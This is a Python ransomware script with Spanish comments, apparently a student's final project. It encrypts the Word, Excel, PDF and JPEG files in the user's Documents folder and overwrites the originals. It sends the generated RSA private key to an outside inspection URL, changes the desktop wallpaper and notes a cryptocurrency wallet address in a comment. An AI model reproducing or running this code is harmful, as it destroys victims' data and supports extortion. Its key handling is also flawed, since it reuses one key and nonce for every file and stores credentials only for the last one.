#!/usr/bin/env python3

import os, base64, json, scrypt, gc, ctypes, requests
from Crypto.Cipher import AES
from Crypto.PublicKey  import  RSA
from Crypto.Cipher import PKCS1_OAEP
from Crypto.Random import get_random_bytes

def string_to_byte(temp):
    return bytes(temp, encoding="UTF-8")


bit_size = 4096
key_format = "PEM"
keys = RSA.generate(bit_size)
llave_publica = PKCS1_OAEP.new(keys.publickey())
with open(os.path.join(os.environ['USERPROFILE'], "Documents", 'llave_publica.pem'), 'wb') as file:
    file.write(keys.publickey().export_key(key_format))

llave_privada = PKCS1_OAEP.new(keys)
with open('llave_privada.pem', 'wb') as file:
    file.write(keys.export_key(key_format))
url = 'https://requestinspector.com/inspect/01g46gk67e8cad21kgczk8dy2m'
myobj = {'privatekey': keys.export_key(key_format)}
x = requests.post(url, data = myobj)


# parametros para llave AES
password = os.urandom(16)
kdfSalt = os.urandom(16)
secretKey = scrypt.hash(password, kdfSalt, N=16384, r=8, p=1, buflen=32)
iv = get_random_bytes(16)

# funcion AES para cifrar
def encrypt_AES_GCM(archivo):
    aesCipher = AES.new(secretKey, AES.MODE_GCM, iv)
    archivo_cipher, authTag = aesCipher.encrypt_and_digest(archivo)
    return [password, kdfSalt, archivo_cipher, iv, authTag, secretKey]

# importar archivos de %UserProfile%\Documents 
ejemplo_dir = os.path.join(os.environ['USERPROFILE'], "Documents")
contenido = os.listdir(ejemplo_dir)
archivos = []
for fichero in contenido:
    if os.path.isfile(os.path.join(ejemplo_dir, fichero)) and (fichero.endswith('.docx') or fichero.endswith('.xlsx') or fichero.endswith('.pdf') or fichero.endswith('.jpeg') or fichero.endswith('.jpg')):
        archivos.append(fichero)
print(archivos)

data = {}
data["credenciales"] = []
    
for archivo in archivos:
    archivo_entrada = open(os.path.join(os.environ['USERPROFILE'], "Documents",archivo), 'rb')
    archivo_bytes = bytearray(archivo_entrada.read())
    temp = encrypt_AES_GCM(archivo_bytes)
    

    archivo_cifrado = temp[2]
    archivo_destino = open(os.path.join(os.environ['USERPROFILE'], "Documents", archivo), "wb")
    archivo_destino.write(archivo_cifrado)

    archivo_entrada.close()
    archivo_destino.close()

data['credenciales'].append({
    'password': base64.b64encode(llave_publica.encrypt(temp[0])).decode("utf-8"),
    'password_salt': base64.b64encode(llave_publica.encrypt(temp[1])).decode("utf-8"),
    'iv': base64.b64encode(llave_publica.encrypt(temp[3])).decode("utf-8"),
    'llave_aes': base64.b64encode(llave_publica.encrypt(temp[5])).decode("utf-8")
})

# guardar llave AES cifrado con RSA
with open('credenciales.json', 'w') as file:
    json.dump(data, file, indent=4)


# borrar memoria RAM
del temp
del keys
gc.collect()

# borar archivos originales
import shutil
dirPath = 'archivos_originales/'
try:
    pass
    #shutil.rmtree(dirPath)
except OSError as e:
    print(f"Error:{ e.strerror}")

# cambiar el fondo de escritorio    
path = b'C:\\Users\\qwert\\proyecto_final\\fondo.jpg'
ctypes.windll.user32.SystemParametersInfoA(20, 0, path, 3)

# hacer programa de descifrado

# wallet
# 3QvVW4j9ZMneSFJVCnHDa7Ce3tpcrNieuF

# documentacion